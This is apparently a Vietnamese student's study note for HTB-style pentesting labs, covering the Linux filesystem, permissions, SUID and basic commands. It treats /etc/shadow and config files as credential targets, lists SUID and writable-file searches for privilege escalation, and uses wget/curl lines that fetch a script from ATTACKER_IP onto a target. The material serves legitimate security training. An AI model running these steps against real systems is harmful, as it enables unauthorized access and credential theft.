# Linux Basics — Filesystem, Permissions, Bash

> **Status:** 🟡 wip  
> **Tags:** #linux #fundamentals  
> **Nguồn:** HTB Academy - Linux Fundamentals  
> **Domino:** `Networking Basics` → **`Linux Basics`** → `PrivEsc Linux`

---

## CHIA — Câu hỏi cần trả lời

- Linux tổ chức file thế nào, và attacker tìm gì trong filesystem?
- Permissions hoạt động ra sao? Tại sao SUID lại nguy hiểm?
- Những lệnh nào cần biết trước khi làm HTB?

---

## CHỌN — 20/80 cần nhớ

**Filesystem:** mọi thứ là file. Config sensitive thường ở `/etc/`, logs ở `/var/log/`, user data ở `/home/`.  
**Permissions:** `rwx` cho owner/group/others. **SUID bit** = file chạy với quyền của owner (nguy hiểm nếu là root).  
**`/etc/passwd` và `/etc/shadow`** = nơi lưu user và password hash — mục tiêu đầu tiên khi vào hệ thống.  
**Pipes `|` và redirect `>`** = cực kỳ quan trọng khi viết command.

---

## CHUỖI — Chi tiết + Thực hành

### Cấu trúc filesystem quan trọng

```
/
├── etc/          ← Config files. Tìm credentials ở đây
│   ├── passwd    ← Danh sách users (đọc được bởi tất cả)
│   ├── shadow    ← Password hashes (chỉ root đọc được)
│   └── crontab   ← Scheduled tasks (check privesc)
├── var/
│   └── log/      ← Log files
├── home/         ← Thư mục user
├── tmp/          ← Tạm thời, thường writable bởi tất cả
├── usr/bin/      ← Chương trình hệ thống
└── root/         ← Home của root (cần root mới vào được)
```

### Permissions

```bash
# Đọc output ls -la
-rwxr-xr-x  1  root  root  /usr/bin/passwd
 ↑↑↑ ↑↑↑ ↑↑↑
 │   │   └── others: r-x (đọc + chạy)
 │   └────── group:  r-x
 └────────── owner:  rwx (đọc + ghi + chạy)

# SUID bit — nguy hiểm!
-rwsr-xr-x   ← 's' thay vì 'x' = SUID
# File này chạy với quyền của owner (root), dù ai chạy
```

### Lệnh thiết yếu cho pentest

```bash
# Khám phá hệ thống
whoami                    # mình là ai?
id                        # user + group IDs
uname -a                  # thông tin kernel (quan trọng cho kernel exploit)
cat /etc/os-release       # distro là gì?
ps aux                    # processes đang chạy
env                       # biến môi trường (có thể có secret)

# Tìm file nhạy cảm
find / -name "*.conf" 2>/dev/null          # tìm config files
find / -perm -u=s -type f 2>/dev/null      # tìm SUID files (privesc!)
find / -writable -type f 2>/dev/null       # file nào mình ghi được?
cat /etc/crontab                           # scheduled tasks

# Đọc file / tìm credentials
cat /etc/passwd
grep -r "password" /etc/ 2>/dev/null
history                   # lịch sử lệnh (hay có password)

# Network
netstat -tulpn            # port nào đang mở?
cat /etc/hosts            # hosts file

# Chuyển file
python3 -m http.server 8080              # tạo HTTP server nhanh
wget http://ATTACKER_IP:8080/file.sh     # tải file về
curl http://ATTACKER_IP:8080/file.sh -o file.sh
```

---

## Associate — Liên kết với thứ đã biết

- **SUID** → liên quan trực tiếp đến PrivEsc Linux (GTFOBins là nơi tra cứu)
- **`/etc/shadow`** → chứa hash → crack bằng hashcat hoặc john
- **crontab** → nếu script trong cron writable bởi mình → PrivEsc
- **`/tmp`** → writable bởi tất cả → nơi thường để payload/shell

---

## Nhớ nhanh — 1 câu

> Linux = mọi thứ là file; kiểm soát được file (SUID, writable config, cron) = kiểm soát được hệ thống.

---

## Xem thêm

- [ ] [HTB Academy - Linux Fundamentals](https://academy.hackthebox.com/module/details/18)
- [ ] [GTFOBins](https://gtfobins.github.io) — tra SUID binary
- [ ] [Linux PrivEsc - TryHackMe](https://tryhackme.com/room/linprivesc)
